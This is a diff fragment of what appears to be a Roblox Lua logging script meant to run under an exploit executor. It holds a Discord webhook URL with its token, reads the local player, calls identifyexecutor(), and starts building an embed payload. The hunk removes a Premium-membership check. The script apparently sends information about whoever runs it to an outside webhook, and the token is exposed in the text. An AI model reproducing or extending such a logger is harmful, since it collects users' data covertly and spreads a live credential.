@@ -3,11 +3,6 @@ local webhookUrl = "https://discord.com/api/webhooks/1314891658092875789/elAqUPd
 local player = game:GetService("Players").LocalPlayer
 local exploit = identifyexecutor() or "Unknown"
 
-local membershipType = "None"
-if player.MembershipType == Enum.MembershipType.Premium then
-	membershipType = "Premium"
-end
-
 local data = {
 	content = "",
 	embeds = {
